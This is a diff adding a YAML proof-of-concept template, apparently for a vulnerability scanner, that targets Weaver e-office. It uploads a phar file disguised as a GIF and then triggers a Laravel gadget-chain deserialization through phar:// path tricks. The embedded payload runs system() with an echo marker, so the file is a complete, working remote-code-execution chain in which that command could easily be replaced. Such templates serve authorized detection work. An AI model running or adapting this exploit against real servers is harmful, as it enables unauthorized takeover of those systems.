@@ -1,0 +1,47 @@
+name: yaml-poc-weaver-weaver_e_office-deserialization-CT-1156977
+binding: dfcd8b52-85c5-4ed0-97c3-417d1284814a
+manual: false
+detail:
+    author: yuxiang.cai
+    vulnerability:
+        id: e9bf2da4-0146-42b8-96e2-ab182256284c
+        level: critical
+    warning: File Upload
+transport: http
+set:
+    boundary: randomLowercase(8)
+    payload: base64Decode("R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQpEAQAAAQAAABEAAAABAAAAAAAOAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6Mzc6ImVjaG8gOXlNODZFU3lGQlhORHdDaDZOYnN4eTl3cmNRclAyNVAiO319CAAAAHRlc3QudHh0BAAAAEvbA2YEAAAADH5/2KQBAAAAAAAAdGVzdIEpwGmDhmYzxumoAjJwcaz4EdU+AgAAAEdCTUI=")
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /eoffice10/server/public/api/attachment/atuh-file
+            headers:
+                Accept: string("*/*")
+                Accept-Encoding: gzip, deflate
+                Content-Type: multipart/form-data; boundary={{boundary}}
+            body: "--{{boundary}}\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"register.inc\"\r\nContent-Type: image/jpeg\r\n\r\n{{payload}}\r\n--{{boundary}}--"
+        expression: response.body_string.contains('attachment_id')
+        output:
+            attachment_id: |
+                '"attachment_id":"(?P<attachment_id>.+?)"'.bsubmatch(response.body)['attachment_id']
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /eoffice10/server/public/api/attachment/path/migrate
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F
+        expression: response.body_string.contains('"status":1')
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /eoffice10/server/public/api/empower/import
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: type=tttt&file={{attachment_id}}
+        expression: response.body_string.contains('9yM86ESyFBXNDwCh6Nbsxy9wrcQrP25P') && response.body_string.contains('"code":"no_file"')
+expression: r0() && r1() && r2()
